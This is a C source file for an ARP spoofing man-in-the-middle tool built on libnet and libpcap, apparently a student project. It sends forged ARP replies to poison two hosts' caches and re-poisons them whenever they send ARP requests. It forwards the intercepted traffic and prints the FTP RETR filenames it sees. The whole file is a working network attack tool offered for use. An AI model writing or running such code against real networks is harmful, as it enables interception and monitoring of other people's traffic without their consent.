#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <libnet.h>
#include <pcap.h>
#include <arpa/inet.h> // ntohs
#include <net/ethernet.h>

typedef struct s_vars
{
	u_int32_t	ip_src;
	u_int8_t	*mac_src;
	u_int32_t	ip_target;
	u_int8_t	*mac_target;
	u_int8_t	*mac_attacker;
	libnet_t	*l;
	pcap_t		*handle;
} t_vars;

void		get_args(int ac, char **av, t_vars *vars);
u_int8_t	*get_own_mac(libnet_t *l);
void		send_gratuitous_arp(u_int8_t *sender_mac, u_int32_t sender_ip,
			u_int8_t *target_mac, u_int32_t target_ip, libnet_t *l);
void 		packet_handler(u_char *args, 
			const struct pcap_pkthdr *packet_header, const u_char *packet_body);
pcap_t 		*open_device(char *filter_exp);

int main(int ac, char **av)
{
	t_vars	vars;
	char	errbuf[LIBNET_ERRBUF_SIZE];

	vars.l = libnet_init(LIBNET_LINK, NULL, errbuf);
	if (!vars.l) {
		fprintf(stderr, "libnet_init() failed: %s\n", errbuf);
		exit(EXIT_FAILURE);
	}

	// Get ip and mac addresses
	get_args(ac, av, &vars);
	vars.mac_attacker = get_own_mac(vars.l);

	// Infect arp tables
	send_gratuitous_arp(vars.mac_attacker, vars.ip_src,
			vars.mac_target, vars.ip_target, vars.l);
	send_gratuitous_arp(vars.mac_attacker, vars.ip_target,
			vars.mac_src, vars.ip_src, vars.l);

	printf("Listening...\n");

	vars.handle = open_device(NULL);
	pcap_loop(vars.handle, 0, packet_handler, (u_char *)&vars);

	pcap_close(vars.handle);
	free(vars.mac_src);
	free(vars.mac_target);
	libnet_destroy(vars.l);
}

void	get_args(int ac, char **av, t_vars *vars)
{
	int	len;

	if (ac != 5)
	{
		printf("Usage: %s <IP-src> <MAC-src> <IP-target> <MAC-target>\n", 
				av[0]);
		exit(0);
	}

	vars->ip_src = libnet_name2addr4(vars->l, av[1], LIBNET_DONT_RESOLVE);
	if (vars->ip_src == -1) {
		fprintf(stderr, "Error converting IP source address.\n");
		libnet_destroy(vars->l);
		exit(EXIT_FAILURE);
	}
	vars->mac_src = libnet_hex_aton(av[2], &len);
	if (!vars->mac_src) {
		fprintf(stderr, "Error converting MAC source address.\n");
		libnet_destroy(vars->l);
		exit(EXIT_FAILURE);
	}
	vars->ip_target = libnet_name2addr4(vars->l, av[3], LIBNET_DONT_RESOLVE);
	if (vars->ip_target == -1) {
		fprintf(stderr, "Error converting IP target address.\n");
		libnet_destroy(vars->l);
		exit(EXIT_FAILURE);
	}
	vars->mac_target = libnet_hex_aton(av[4], &len);
	if (!vars->mac_target) {
		fprintf(stderr, "Error converting MAC target address.\n");
		libnet_destroy(vars->l);
		free(vars->mac_src);
		exit(EXIT_FAILURE);
	}
}

u_int8_t	*get_own_mac(libnet_t *l)
{
	struct libnet_ether_addr	*mac_addr;

	mac_addr = libnet_get_hwaddr(l);
	if (!mac_addr) {
		fprintf(stderr, "Couldn't get own IP address: %s\n",
				libnet_geterror(l));
		libnet_destroy(l);
		exit(EXIT_FAILURE);
	}
	
	return (mac_addr->ether_addr_octet);
}

void	send_gratuitous_arp(u_int8_t *sender_mac, u_int32_t sender_ip,
		u_int8_t *target_mac, u_int32_t target_ip, libnet_t *l)
{
	u_int8_t	mac_zero_addr[6] = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0};

	// Building ARP header
	if (libnet_autobuild_arp( ARPOP_REPLY, sender_mac,
				(u_int8_t *)(&sender_ip),
				mac_zero_addr, (u_int8_t *)(&target_ip), l) == -1)
	{
		fprintf(stderr, "Error building ARP header: %s\n", libnet_geterror(l));
		libnet_destroy(l);
		exit(EXIT_FAILURE);
	}
	// Building Ethernet header
	if (libnet_autobuild_ethernet(target_mac, ETHERTYPE_ARP, l) == -1)
	{
		fprintf(stderr, "Error building Ethernet header: %s\n",
				libnet_geterror(l));
		libnet_destroy(l);
		exit(EXIT_FAILURE);
	}
	// Writing packet
	int bytes_written;
	bytes_written = libnet_write(l);
	if (bytes_written == -1)
		fprintf(stderr, "Error writing packet: %s\n", libnet_geterror(l));
}

void packet_handler(u_char *args, const struct pcap_pkthdr *packet_header,
		const u_char *packet_body)
{
	t_vars *vars = (t_vars *)args;
	struct ether_header *eth_header;
	eth_header = (struct ether_header *)packet_body;

	if (ntohs(eth_header->ether_type) == ETHERTYPE_ARP) // If ARP packet
	{
		u_int8_t opcode = (u_int8_t)*(packet_body + 14 + 7);
		if (opcode == 1) // If ARP request
		{
			u_int32_t target_ip = *(u_int32_t *)(packet_body + 14 + 24);
			if (target_ip == vars->ip_target)
				send_gratuitous_arp(vars->mac_attacker, vars->ip_target,
						vars->mac_src, vars->ip_src, vars->l);
			if (target_ip == vars->ip_src)
				send_gratuitous_arp(vars->mac_attacker, vars->ip_src,
						vars->mac_target, vars->ip_target, vars->l);
		}
	}
	else
	{
		if (ntohs(eth_header->ether_type) == ETHERTYPE_IP
			&& !memcmp("RETR", packet_body + 14 + 20 + 32, 4) // ether + ip + tcp
			&& memcmp(vars->mac_attacker, eth_header->ether_shost, 6)) // attacker mac != source mac
			printf("Transfering: %s\n", (char *)packet_body+14+20+32+5);
		pcap_inject(vars->handle, packet_body, packet_header->caplen);
	}
}

pcap_t *open_device(char *filter_exp)
{
	char	*device = NULL;
	char	error_buffer[PCAP_ERRBUF_SIZE];
	pcap_t	*handle;

	// Get name device
	pcap_if_t	*alldevsp;
	int res = pcap_findalldevs(&alldevsp, error_buffer);
	if (alldevsp != NULL)
		device = alldevsp->name;
	if (res || !device)
	{
		fprintf(stderr, "Error finding device: %s\n", error_buffer);
		exit(EXIT_FAILURE);
	}
	// Open device for live capture
	handle = pcap_open_live(device, BUFSIZ, 0, -1, error_buffer);
	if (!handle)
	{
		fprintf(stderr, "Could not open device %s: %s\n", device, error_buffer);
		exit(EXIT_FAILURE);
	}
	// Filters
	if (filter_exp)
	{
		struct bpf_program filter;
		if (pcap_compile(handle, &filter, filter_exp, 0, 0) == -1)
		{
			fprintf(stderr, "Bad filter - %s\n", pcap_geterr(handle));
			exit(EXIT_FAILURE);
		}
		if (pcap_setfilter(handle, &filter) == -1)
		{
			fprintf(stderr, "Error setting filter - %s\n", pcap_geterr(handle));
			exit(EXIT_FAILURE);
		}
	}
	return (handle);
}
